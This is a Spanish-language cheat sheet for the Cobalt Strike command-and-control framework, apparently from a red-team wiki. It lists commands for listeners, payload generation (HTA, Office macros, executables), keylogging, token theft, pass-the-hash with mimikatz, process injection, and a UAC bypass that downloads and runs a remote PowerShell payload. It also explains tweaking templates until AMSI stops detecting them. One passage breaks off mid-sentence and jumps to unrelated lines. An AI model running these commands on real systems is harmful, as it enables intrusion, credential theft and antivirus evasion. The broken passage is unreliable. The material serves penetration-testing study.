# Cobalt Strike

### Listeners

### Listeners de C2

`Cobalt Strike -> Listeners -> Add/Edit` y luego puedes seleccionar dónde escuchar, qué tipo de beacon usar (http, dns, smb...) y más.

### Listeners Peer2Peer

Los beacons de estos listeners no necesitan hablar directamente con el C2, pueden comunicarse a través de otros beacons.

`Cobalt Strike -> Listeners -> Add/Edit` y luego debes seleccionar los beacons TCP o SMB.

* El **beacon TCP establecerá un listener en el puerto seleccionado**. Para conectarse a un beacon TCP, usa el comando `connect <ip> <port>` desde otro beacon.
* El **beacon SMB escuchará en un pipename con el nombre seleccionado**. Para conectarse a un beacon SMB, debes usar el comando `link [target] [pipe]`.

### Generar y alojar payloads

#### Generar payloads en archivos

`Attacks -> Packages ->`&#x20;

* **`HTMLApplication`** para archivos HTA
* **`MS Office Macro`** para un documento de Office con una macro
* **`Windows Executable`** para un .exe, .dll o servicio .exe
* **`Windows Executable (S)`** para un .exe, .dll o servicio .exe **sin etapas** (mejor sin etapas que con etapas, menos IoCs)

#### Generar y alojar payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Esto generará un script/ejecutable para descargar el beacon de cobalt strike en formatos como: bitsadmin, exe, powershell y python.

#### Alojar payloads

Si ya tienes el archivo que deseas alojar en un servidor web, simplemente ve a `Attacks -> Web Drive-by -> Host File` y selecciona el archivo a alojar y la configuración del servidor web.

### Opciones de Beacon

<pre class="language-bash"><code class="lang-bash"># Ejecutar binario .NET local
execute-assembly &#x3C;/path/to/executable.exe>

# Capturas de pantalla
printscreen    # Tomar una captura de pantalla única a través del método PrintScr
screenshot     # Tomar una captura de pantalla única
screenwatch    # Tomar capturas de pantalla periódicas del escritorio
## Ve a Ver -> Capturas de pantalla para verlas

# keylogger
keylogger [pid] [x86|x64]
## Ver > Pulsaciones de teclas para ver las teclas presionadas

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inyectar acción de escaneo de puertos dentro de otro proceso
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Importar módulo Powershell
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;solo escribe aquí los comandos de powershell>

# Impersonación de usuario
## Generación de token con credenciales
make_token [DOMAIN\user] [password] #Crear token para suplantar a un usuario en la red
ls \\computer_name\c$ # Intenta usar el token generado para acceder a C$ en una computadora
rev2self # Dejar de usar el token generado con make_token
## El uso de make_token genera el evento 4624: Se inició sesión correctamente en una cuenta. Este evento es muy común en un dominio de Windows, pero se puede reducir filtrando en el tipo de inicio de sesión. Como se mencionó anteriormente, utiliza LOGON32_LOGON_NEW_CREDENTIALS que es el tipo 9.

# Bypass de UAC
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Robar token de pid
## Como make_token pero robando el token de un proceso
steal_token [pid] # Además, esto es útil para acciones de red, no para acciones locales
## Desde la documentación de la API sabemos que este tipo de inicio de sesión "permite al llamador clonar su token actual". Es por eso que la salida de Beacon dice Impersonated &#x3C;current_username> - está suplantando nuestro propio token clonado.
ls \\computer_name\c$ # Intenta usar el token generado para acceder a C$ en una computadora
rev2self # Dejar de usar el token generado con steal_token

## Ejecutar proceso con nuevas credenciales
spawnas [domain\username] [password] [listener] #Hazlo desde un directorio con acceso de lectura como: cd C:\
## Como make_token, esto generará el evento de Windows 4624: Se inició sesión correctamente en una cuenta, pero con un tipo de inicio de sesión de 2 (LOGON32_LOGON_INTERACTIVE). Detallará el usuario que llama (TargetUserName) y el usuario suplantado (TargetOutboundUserName).

## Inyectar en proceso
inject [pid] [x64|x86] [listener]
## Desde un punto de vista de OpSec: No realices inyección entre plataformas a menos que realmente tengas que hacerlo (por ejemplo, x86 -> x64 o x64 -> x86).

## Pasar el hash
## Este proceso de modificación requiere parchear la memoria de LSASS, lo que es una acción de alto riesgo, requiere privilegios de administrador local y no es muy viable si Protected Process Light (PPL) está habilitado.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pasar el hash a través de mimikatz
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## Sin /run, mimikatz genera un cmd.exe, si estás ejecutando como usuario con escritorio, verá
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
No olvides cargar el script agresivo `dist-pipe\artifact.cna` para indicarle a Cobalt Strike que use los recursos del disco que queremos y no los cargados.

### Kit de recursos

La carpeta ResourceKit contiene las plantillas para los payloads basados en scripts de Cobalt Strike, incluyendo PowerShell, VBA y HTA.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con las plantillas, puedes encontrar qué es lo que el defensor (en este caso AMSI) no está aceptando y modificarlo:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modificar las líneas detectadas permite generar una plantilla que no será detectada.

No olvides cargar el script agresivo `ResourceKit\resources.cna` para indicarle a Cobalt Strike que use los recursos del disco que queremos y no los cargados.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

